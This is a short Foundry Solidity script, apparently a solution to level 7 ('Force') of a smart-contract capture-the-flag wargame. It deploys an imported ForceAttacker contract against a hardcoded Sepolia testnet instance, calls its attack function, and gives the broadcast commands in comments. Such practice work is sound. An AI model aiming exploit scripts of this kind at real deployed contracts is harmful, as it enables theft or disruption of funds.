// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "./Force.sol";
import {ForceAttacker} from "./ForceAttacker.sol";

contract ForceScript is Script {
    address _instance = 0xd0092CCd256378641c0562D4e3B044C62B55a478;
    ForceAttacker public forceAttacker;
    
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast();

        forceAttacker = new ForceAttacker(_instance);
        forceAttacker.attack();

        vm.stopBroadcast();
    }
}

//forge script Level7/Force.s.sol --broadcast --rpc-url sepolia
//forge script Level7/Force.s.sol 